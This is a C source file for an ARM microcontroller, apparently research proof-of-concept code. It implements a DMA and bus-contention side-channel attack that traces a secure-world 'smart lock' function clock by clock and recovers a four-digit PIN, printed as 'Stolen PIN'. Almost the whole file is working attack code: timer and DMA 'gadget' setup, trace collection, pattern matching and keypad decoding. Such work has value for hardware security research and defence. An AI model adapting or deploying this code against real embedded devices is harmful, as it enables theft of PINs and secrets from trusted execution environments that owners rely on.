#include "busSideChannel_lib.h"
#include "patterns.h"
#include "cache.h"
#include "tim.h"
#include "dma.h"

// "nop" instruction cannot used, because it is not reliable! Sometimes it
// last 1 clock other times 0 clocks. Even with -o0 and the actual nop being
// present in the asm code. I think the processor sometimes does not execute the
// nop instructions
#define MY_NOP()  __asm volatile("mov r8,r8")
// ------------------------- MACROS FOR SHIFTS AND DELAYS ----------------------
#define DELAY_6_CLOCKS() do { \
		MY_NOP(); \
		MY_NOP(); \
		MY_NOP(); \
		MY_NOP(); \
		MY_NOP(); \
		MY_NOP(); \
	} while(0)

#define TEN_NOPS()do {\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
	} while(0)

// 600 Nops
#define NOPS_TO_AVOID_COLLISIONS() do { \
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
    TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
      TEN_NOPS();\
	} while(0)

//#define PUTTY
#define RED_COLOR()     LOG_MSG("\033[1;31m")
#define RESET_COLOR()   LOG_MSG("\033[0m")
#define N_INSTRUCTIONS  2000
// #define N_INSTRUCTIONS  10000
#define TRACE_SIZE      N_INSTRUCTIONS
#define PATTERN_SIZE    27
#define RECORD_SIZE     200
#define LOOP_SIZE       16
#define BUFFER_SIZE     1000
#define PIN_LEN         4

int volatile  *ptr_cnt = (int volatile *) 0x40001400+0x24;
static uint32_t dst[BUFFER_SIZE] = {0};
char dma_accurate_collisions_latencies[N_INSTRUCTIONS] = {0};
int pattern[PATTERN_SIZE] = { 12	,  11	,  10	,  10	,  10	,  10	,  12	,  11	,  10	,  10	,  10	,  10	,  12	,  11	,  10	,  10	,  10	,  10	,  10	,  10	,  11	,  10	,  10	,  10	,  10	,  12	,  11};
int record[RECORD_SIZE] = {0};
const char keymap[] = {
    '1', '4', '7', '*',
    '2', '5', '8', '0',
    '3', '6', '9', '#',
    'A', 'B', 'C', 'D', 
}; 

void print_instructions(int *instructions){
  // Print Instructions
  int instruction = 0;
  LOG_MSG("INS\t|");
  while(instructions[instruction] != END){
    if(instructions[instruction] == MOV)
      LOG_MSG(" MOV\t|");
    if(instructions[instruction] == LDR)
      LOG_MSG(" LDR\t|");
    if(instructions[instruction] == NOP)
      LOG_MSG(" NOP\t|");
    if(instructions[instruction] == PUSH)
      LOG_MSG("PUSH\t|");
    if(instructions[instruction] == SUB)
      LOG_MSG(" SUB\t|");
    if(instructions[instruction] == ADD)
      LOG_MSG(" ADD\t|");
    if(instructions[instruction] == MOVS)
      LOG_MSG("MOVS\t|");
    if(instructions[instruction] == CMP)
      LOG_MSG(" CMP\t|");
    if(instructions[instruction] == BLE)
      #ifdef PUTTY
        {
        RED_COLOR();
        LOG_MSG(" BLE\t|");
        RESET_COLOR();
        }
      #else
        LOG_MSG(" BLE\t|");
      #endif
    if(instructions[instruction] == B)
      #ifdef PUTTY
        {
        RED_COLOR();
        LOG_MSG("   B\t|");
        RESET_COLOR();
        }
      #else
        LOG_MSG("   B\t|");
      #endif
    if(instructions[instruction] == ADDS)
      LOG_MSG("ADDS\t|");
    if(instructions[instruction] == LDRW)
      LOG_MSG("LDRW\t|");
    if(instructions[instruction] == BX)
      LOG_MSG("  BX\t|");
    if(instructions[instruction] == BLX)
      LOG_MSG(" BLX\t|");
    if(instructions[instruction] == MOVW)
      LOG_MSG("MOVW\t|");
    if(instructions[instruction] == STR)
      LOG_MSG(" STR\t|");
    if(instructions[instruction] == LSL)
      LOG_MSG(" LSL\t|");
    if(instructions[instruction] == ANDS)
      LOG_MSG("ANDS\t|");
    if(instructions[instruction] == BNE)
      #ifdef PUTTY
        {
        RED_COLOR();
        LOG_MSG(" BNE\t|");
        RESET_COLOR();
        }
      #else
        LOG_MSG(" BNE\t|");
      #endif
    if(instructions[instruction] == UXTB)
      LOG_MSG("UXTB\t|");
    if(instructions[instruction] == STRB)
      LOG_MSG("STRB\t|");
    if(instructions[instruction] == BEQ)
      #ifdef PUTTY
        {
        RED_COLOR();
        LOG_MSG(" BEQ\t|");
        RESET_COLOR();
        }
      #else
        LOG_MSG(" BEQ\t|");
      #endif 
    if(instructions[instruction] == LD_PC)
      LOG_MSG("LD_PC\t|");
    if(instructions[instruction] == BL)
      #ifdef PUTTY
        {
        RED_COLOR();
        LOG_MSG("  BL\t|");
        RESET_COLOR();
        }
      #else
        LOG_MSG("  BL\t|");
      #endif 
    if(instructions[instruction] == RSB)
      LOG_MSG(" RSB\t|");
    instruction++;
  }
  LOG_MSG("\n");
}

void print_accurate_collision(){
  int collision = 0, instruction = 0;
  LOG_MSG("COL\t|");
  while(instruction < TRACE_SIZE){
    LOG_MSG(" %d\t|", dma_accurate_collisions_latencies[collision] );
    instruction++;
    collision++;
  }
  LOG_MSG("\n");
}

void print_clock(){
  // print clock
  int i = 0, instruction = 0;
  LOG_MSG("CLK\t|");
  while(instruction++ < TRACE_SIZE)
    LOG_MSG("%d\t|", i++);
  LOG_MSG("\n");
}

void print_accurate_collision_w_instruction(int *instructions){
  int collision = 0, instruction = 0;
  LOG_MSG("COL\t|");
  while(instructions[instruction] != END){
    LOG_MSG(" %d\t|", dma_accurate_collisions_latencies[collision] );
    instruction++;
    collision++;
  }
  LOG_MSG("\n");
}

void print_clock_w_instruction(int *instructions){
  // print clock
  int i = 0, instruction = 0;
  LOG_MSG("CLK\t|");
  while(instructions[instruction++] != END)
    LOG_MSG("%d\t|", i++);
  LOG_MSG("\n");
}

//******************************************************************************
// DMA Side-Channel -> Accurate Tracing 
//******************************************************************************
// Note: For back-to-back 1 clock precision tracing (when the trace is taken in
//multiple rounds) ARR can have other values than 1, but in the range of 1 to 9,
//otherwise the next DMA transaction, does not start right after the previous one
#define START_ACCURATE_TRACE() do{\
    int volatile  *tim3_CR1 =   (int volatile *) 0x40000400, \
                  *tim3_SR =    (int volatile *) 0x40000410,  \
                  *tim3_DIER =  (int volatile *) 0x4000040C,  \
                  *tim3_EGR =   (int volatile *) 0x40000414,  \
                  *tim3_CNT =   (int volatile *) 0x40000424, \
                  *tim3_ARR =   (int volatile *) 0x4000042C; \
    *tim3_ARR = auto_reload; \
    *tim3_CNT = (auto_reload-1) - clock_to_collide; \
    *tim3_SR = 0; \
    *tim3_DIER = 0; \
    HAL_TIM_Base_Start(&htim7);                                      \
    HAL_DMA_Start(&hdma_tim3_up, (uint32_t)ptr_cnt, (uint32_t)&dst, n_collisions); \
    __HAL_DMA_ENABLE(&hdma_tim3_up); \
    *tim3_DIER = 1<<8; \
    __HAL_TIM_ENABLE(&htim3);\    
    MY_NOP(); /* 1 Clock to wait that tim3 start counting*/\    
    MY_NOP(); /* 1 Clock for the counter reach the smallest ARR value = 1*/\    
    MY_NOP(); /* 1 clock for the interrupt (a.k.a, update event) be generated*/\  
    MY_NOP(); /* 1 clock dma setup*/\    
    MY_NOP(); /* 1 clock dma setup*/\   
    DELAY_6_CLOCKS(); /* delay to ensure the 1st collision happens in the victim 1st clock*/\ 
  }while(0)

#define END_ACCURATE_TRACE() do{\
    NOPS_TO_AVOID_COLLISIONS(); \
    __HAL_TIM_DISABLE(&htim3);\
    HAL_DMA_Abort(&hdma_tim3_up);\
    HAL_TIM_Base_Stop(&htim7);\
    *ptr_cnt = 0;\
  }while(0)

// Auto_reload -> number o clocks the timer will count untill interrupt
// clock_to_collide -> the clock where the 1st interrupt will occur
// n_collisions -> number of collisions that we want to provoke, i.e., DMA reads
__attribute__((optimize(0))) void get_accurate_trace( int  auto_reload, 
                                                      int clock_to_collide, 
                                                      int n_collisions,
                                                      void (*victim)()){
  //clock_to_collide is used inside this macro
  START_ACCURATE_TRACE();
  // Victim start --------------------------------------------------------------
  victim();
  // Victim end ----------------------------------------------------------------
  END_ACCURATE_TRACE();
}

void process_accurate_collision(int collision_n){
  dma_accurate_collisions_latencies[collision_n] = (dst[1]-dst[0])&0xFF;
}

__attribute__((optimize(0))) void get_trace_print_instruction(void (*victim)(), 
                                                              int ICache_EN){
  // Accurate Trace NS -> Calling Victim PATH 1 --------------------------------
  int first_clock_collision = 0, instruction = 0, auto_reload = 1,  n_collisions = 2;
  while(find[instruction++] != END){
    if(ICache_EN)
      ICache_invalidation();
    get_accurate_trace(auto_reload, first_clock_collision, n_collisions, victim);
    process_accurate_collision(first_clock_collision++);
  }
  LOG_MSG("\n");
  print_clock_w_instruction(find);
  print_instructions(find);
  print_accurate_collision_w_instruction(find);
  LOG_MSG("\n");
}

__attribute__((optimize(0))) void get_trace(void (*victim)(), int ICache_EN){
  // Accurate Trace NS -> Calling Victim PATH 1 --------------------------------
  int first_clock_collision = 0, instruction = 0, auto_reload = 1,  n_collisions = 2;
  while(instruction++ < TRACE_SIZE){
    if(ICache_EN)
      ICache_invalidation();
    get_accurate_trace(auto_reload, first_clock_collision, n_collisions, victim);
    process_accurate_collision(first_clock_collision++);
  }
  LOG_MSG("\n");
  print_clock();
  print_accurate_collision();
  LOG_MSG("\n");
}

int find_pattern(){
    int trace_index = 0, record_index = 0, pattern_index = 0;
    while (trace_index < TRACE_SIZE)
    {
        if(dma_accurate_collisions_latencies[trace_index] == pattern[pattern_index])
        {
            while (dma_accurate_collisions_latencies[trace_index + pattern_index] == pattern[pattern_index])
            {
                if(pattern_index == PATTERN_SIZE - 1){
                    record[record_index++] = trace_index;
                    trace_index += pattern_index;
                }
                pattern_index++;
            }
        }
        pattern_index = 0;
        trace_index++;
    }
    
}

__attribute__((optimize(0))) void get_trace_find_clocks(void (*victim)(),
                                                       int ICache_EN)
{
  // Accurate Trace NS -> Calling Victim PATH 1 --------------------------------
  int first_clock_collision = 0, instruction = 0, auto_reload = 1,  n_collisions = 2;
  
  while(instruction++ < TRACE_SIZE){
    if(ICache_EN)
      ICache_invalidation();
    get_accurate_trace(auto_reload, first_clock_collision, n_collisions, victim);
    process_accurate_collision(first_clock_collision++);
  }

  find_pattern();

  LOG_MSG("Times: \n");

  if(ICache_EN){
    //discard first iteration, because the code is not in cache. 
    int iteration_offset = LOOP_SIZE-1;
    LOG_MSG("      - 1st clock to collide  = %d \n", 
          record[iteration_offset]+OFFSET);
    LOG_MSG("      - next iteration time   = %d \n", 
          record[iteration_offset+1]-record[iteration_offset]);
    LOG_MSG("      - next Loop time        = %d \n", 
          record[LOOP_SIZE-1]-record[LOOP_SIZE-2]);
  }
  else{
    LOG_MSG("      - 1st clock to collide  = %d \n", record[LOOP_SIZE]+OFFSET);
    LOG_MSG("      - next iteration time   = %d \n", record[1]-record[0]);
    LOG_MSG("      - next Loop time        = %d \n", record[LOOP_SIZE]-record[LOOP_SIZE-1]);
  }

  if(ICache_EN){
    LOG_MSG("Redord[%d] = %d (%d)\n", 0,  record[0], 0);
    for(int i=1; i<50; i++)
      LOG_MSG("Redord[%d] = %d (+%d)\n", i,  record[i], record[i]-record[i-1]);
  }

}

extern void set_black_color();
extern void set_bold_black_color();

extern void set_red_color();
extern void set_bold_red_color();

extern void set_green_color();
extern void set_bold_green_color();

extern void set_yellow_color();
extern void set_bold_yellow_color();

extern void set_blue_color();
extern void set_bold_blue_color();

extern void set_purple_color();
extern void set_bold_purple_color();

extern void set_cyan_color();
extern void set_bold_cyan_color();

extern void set_white_color();
extern void set_bold_white_color();

extern void set_grey_color();
extern void set_bold_grey_color();


void __attribute__((optimize(0))) autonomous_single_trace( int first_clock,
                                                          int next_iteration_time,
                                                          int next_loop_time,
                                                          void (*victim)()){
  // TIM 2 -> 32 bits timer
  int volatile  *tim2_CR1 =  (int volatile  *) 0x40000000,
                *tim2_SR =   (int volatile  *) 0x40000010,
                *tim2_DIER = (int volatile  *) 0x4000000C,
                *tim2_EGR =  (int volatile  *) 0x40000014,
                *tim2_CNT =  (int volatile  *) 0x40000024,
                *tim2_ARR =  (int volatile  *) 0x4000002C,
                *tim2_CCR1 = (int volatile  *) 0x40000034;

  int volatile  *tim3_CR1 =  (int volatile  *) 0x40000400,
                *tim3_SR =   (int volatile  *) 0x40000410,
                *tim3_DIER = (int volatile  *) 0x4000040C,
                *tim3_EGR =  (int volatile  *) 0x40000414,
                *tim3_CNT =  (int volatile  *) 0x40000424,
                *tim3_ARR =  (int volatile  *) 0x4000042C,
                *tim3_CCR1 = (int volatile  *) 0x40000434;

  int volatile  *tim4_CR1 =  (int volatile  *) 0x40000800,
                *tim4_SR =   (int volatile  *) 0x40000810,
                *tim4_DIER = (int volatile  *) 0x4000080C,
                *tim4_EGR =  (int volatile  *) 0x40000814,
                *tim4_CNT =  (int volatile  *) 0x40000824,
                *tim4_ARR =  (int volatile  *) 0x4000082C;

  // TIM 5 -> 32 bits timer
  int volatile  *tim5_CR1 =  (int volatile  *) 0x40000C00,  
                *tim5_SR =   (int volatile  *) 0x40000C10,  
                *tim5_DIER = (int volatile  *) 0x40000C0C,  
                *tim5_EGR =  (int volatile  *) 0x40000C14,  
                *tim5_CNT =  (int volatile  *) 0x40000C24, 
                *tim5_ARR =  (int volatile  *) 0x40000C2C,
                *tim5_CCR1=  (int volatile  *) 0x40000C34, 
                *tim5_CCR2=  (int volatile  *) 0x40000C38; 

   int volatile  *tim8_CR1 = (int volatile  *)  0x40013400,
                 *tim8_SR =  (int volatile  *)  0x40013410,
                 *tim8_DIER =(int volatile  *)  0x4001340C,
                 *tim8_EGR = (int volatile  *)  0x40013414,
                 *tim8_CNT = (int volatile  *)  0x40013424,
                 *tim8_ARR = (int volatile  *)  0x4001342C,
				         *tim8_DMAR =(int volatile  *)  0x4001344C;

  // Clean and reconfigure Timers, because on setup, it was generated an update
  //event that changed the default configs of the timers
  int second_time = next_iteration_time, // inner loop time, time of one iteration
      first_collision_time = first_clock - 6 - 2; 
  // time to 1st collision inside the inner loop
  // -2, because the *tim2_CR1 |= (1<<0); // start hw automation will last longer
  // by not being in cache

  // jus for test porpuses
  tim3_CCR1[0] = -1;
  tim3_CCR1[1] = -1;
  tim3_CCR1[2] = -1;
  tim3_CCR1[3] = -1;

  //  This is needed because in MX_TIM4_Init, it was generated an update event
  *tim3_CR1 &= ~(1<<0);
  *tim3_SR = 0;
  *tim3_CNT = 0;

  //  This is needed because in MX_TIM4_Init, it was generated an update event
  *tim4_CR1 &= ~(1<<0);
  *tim4_SR = 0;
  *tim4_CNT = 0;

// GADGET 1.1 ------------------------------------------------------------------
  //  This is needed because in MX_TIM2_Init, it was generated an update event
  *tim2_CR1 &= ~(1<<0);
  *tim2_ARR = second_time; // 2nd Time, i.e., inner Loop Time
  *tim2_EGR |= 1<<0; // update preload regs
  *tim2_CNT = 0; //has to be CNT < CCR1 (for not triggering before time DMA reads )
  *tim2_SR = 0;
  *tim2_DIER |= 1<<8;
  *tim2_CR1 |= (1<<2); //Only counter overflow generates event
//------------------------------------------------------------------------------

// GADGET 1.3 ------------------------------------------------------------------
  //  This is needed because in MX_TIM8_Init, it was generated an update event
  // and because we did a udpate event to TIM 2 what generate a trigger for
  // TIM 8, so we need to clear it now
  *tim8_CR1 &= ~(1<<0);
  *tim8_SR = 0;
  *tim8_CNT = 0;
  // *tim8_DIER |= 1<<8; // enable dma update event
  *tim8_DIER |= 1<<9; // enable dma compare event ch1
  *tim8_DIER |= 1<<10; // enable dma compare event ch2
  *tim8_CR1 |= (1<<2); //Only counter overflow generates event
//------------------------------------------------------------------------------

// GADGET 1.2 ------------------------------------------------------------------
  int volatile CR1[1] = {0x80};
  // DMA in circular mode, because we don't know the numbers o transfer 
  HAL_DMA_Start(&hdma_tim2_up, (uint32_t)CR1, (uint32_t)tim8_CR1, 1);
  __HAL_DMA_ENABLE(&hdma_tim2_up);
//------------------------------------------------------------------------------

//  GADGET 4.1 -----------------------------------------------------------------
  //configure gadget 4.1 auxiliar timer (timer used just to store data)
  *tim5_CR1 &= ~(1<<0);
  //time to next loop when a collision happens
  // -1 -> collision in gadget 1.2, delayed gadget 3 that delayed this gadget
  //      -> collision with 11 clks latency (-1)
  //      -> collision with 12 clks latency (-2)
  // -2 -> shift introduced by collision path
  // -8 -> delay due to gadget 3
  *tim5_ARR = *tim2_ARR - ( (next_loop_time-16) - 1 - 2 - 8); 
  *tim5_CCR1 = 22 + 2; // backup reg to restore tim 5 counter 
  *tim5_EGR |= 1<<0; // update preload regs
  *tim5_SR = 0;
  *tim5_DIER |= 1<<8; // enable dma update event
  // DMA in circular mode, because we don't know the numbers o transfer 
  HAL_DMA_Start(&hdma_tim5_up, (uint32_t)tim5_CCR1, (uint32_t)tim5_CNT, 1);
  __HAL_DMA_ENABLE(&hdma_tim5_up);
// -----------------------------------------------------------------------------

//  GADGET 4.2 -----------------------------------------------------------------
   // +2 -> clks that is the shift introduced by collision
   // 22 -> Trial and error
   *tim5_CNT = 22 + 2;
  HAL_DMA_Start(&hdma_tim8_ch1, (uint32_t)tim5_CNT, (uint32_t)tim2_CNT, 1);
  __HAL_DMA_ENABLE(&hdma_tim8_ch1);
// -----------------------------------------------------------------------------

// GADGET 4.3 ------------------------------------------------------------------
  HAL_DMA_Start(&hdma_tim8_ch2, (uint32_t)tim4_CNT, (uint32_t)tim3_CCR1, PIN_LEN);
  __HAL_DMA_ENABLE(&hdma_tim8_ch2);
//------------------------------------------------------------------------------

// GADGET 2 --------------------------------------------------------------------
  HAL_TIM_Base_Start(&htim4); // Enable TIM4 (Hw Loop)
  *tim4_DIER |= 1<<8; // enable dma update event
  *tim4_CR1 |= (1<<2); //Only counter overflow generates event
//------------------------------------------------------------------------------
// GADGET 3 --------------------------------------------------------------------
 // TODO: ATENTION!!!! -> o aux_periph está na SRAM 2 e vai criar contention caso
 // o código da vítima tb use SRAM 2. Colocar armazenado num peripheral
  //  int volatile *aux_periph = 0x20003000; //  SRAM 2 for now.   
  int volatile *aux_periph = (int volatile *)0x42020C00; //  GPIO D.   
   
  // -16 -> tim 4 delay + delay due to DMA gadget 1.2 + DMA gadget 3 latency
  // this time is unique for NORMAL CASE Next Loop time
  // the COLLISION CASE Next Loop time will be adjusted by gadget 4.1/4.2
  *aux_periph = *tim2_ARR - (next_loop_time-16); 

  // DMA in circular mode, because we don't know the numbers o transfer 
  HAL_DMA_Start(&hdma_tim4_up, (uint32_t)aux_periph, (uint32_t)tim2_CNT, 1);
  __HAL_DMA_ENABLE(&hdma_tim4_up);
//------------------------------------------------------------------------------

  *tim2_CNT = *tim2_ARR - first_collision_time;
  *tim2_CR1 |= (1<<0); // start hw automation

  victim();

 *tim2_CR1 &= ~(1<<0);
 *tim4_CR1 &= ~(1<<0);
 *tim8_CR1 &= ~(1<<0);

 *tim8_CNT = 0;
 *tim2_CNT = 0;
 *tim4_CNT = 0;

 HAL_DMA_Abort(&hdma_tim2_up);
 HAL_DMA_Abort(&hdma_tim4_up);
 HAL_DMA_Abort(&hdma_tim5_up);
 HAL_DMA_Abort(&hdma_tim8_ch1);
 HAL_DMA_Abort(&hdma_tim8_ch2);
 HAL_TIM_Base_Stop(&htim4);

  // for(int i = 0; i<4; i++){
  //     LOG_MSG("PIN %d = %d\n", (i), (tim3_CCR1[i] - 1)&0xf); 
  // }
  // LOG_MSG("\n");
  set_green_color();
  LOG_MSG("     [TA] Leaving SMART LOCK TA\n");
  LOG_MSG("     ***********************************\n");
  LOG_MSG("     ***********************************\n");
  
  // LOG_MSG("Stolen PIN  = %d %d %d %d\n",(tim3_CCR1[0] -1)
  //                                     ,(tim3_CCR1[1] - 1)
  //                                     ,(tim3_CCR1[2] - 1)
  //                                     ,(tim3_CCR1[3] - 1));

  set_red_color();
  LOG_MSG("\n");
  LOG_MSG("[NS] Stolen PIN  = %c %c %c %c\n",keymap[(tim3_CCR1[0] - 1)&0xf]
                                      ,keymap[(tim3_CCR1[1] - 1)&0xf]
                                      ,keymap[(tim3_CCR1[2] - 1)&0xf]
                                      ,keymap[(tim3_CCR1[3] - 1)&0xf]);
}